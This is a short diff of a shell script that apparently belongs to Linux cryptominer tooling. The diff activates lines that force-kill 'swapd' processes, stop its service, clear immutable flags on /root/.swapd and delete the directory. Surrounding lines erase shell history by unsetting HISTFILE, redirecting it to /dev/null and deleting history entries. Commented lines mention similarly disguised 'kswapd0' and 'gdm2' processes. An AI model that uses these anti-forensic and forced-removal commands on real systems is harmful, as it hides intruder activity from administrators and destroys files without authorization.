@@ -4,10 +4,14 @@ unset HISTFILE
 unset HISTFILE ;history -d $((HISTCMD-1))
 export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
 
-#chattr -i /root/.swapd/*
-#chattr -i /root/.swapd/
-#chattr -i /root/.swapd/.swapd
-#rm -rf /root/.swapd/
+#killall swapd
+kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+systemctl stop swapd
+
+chattr -i /root/.swapd/*
+chattr -i /root/.swapd/
+chattr -i /root/.swapd/.swapd
+rm -rf /root/.swapd/
 
 #systemctl disable gdm2 --now
 #systemctl disable swapd --now
@@ -17,9 +21,6 @@ export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
 
 #chattr -i $HOME/.swapd/
 #chattr -i $HOME/.swapd/config.json
-
-#killall swapd
-#kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 #killall kswapd0
 #kill -9 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
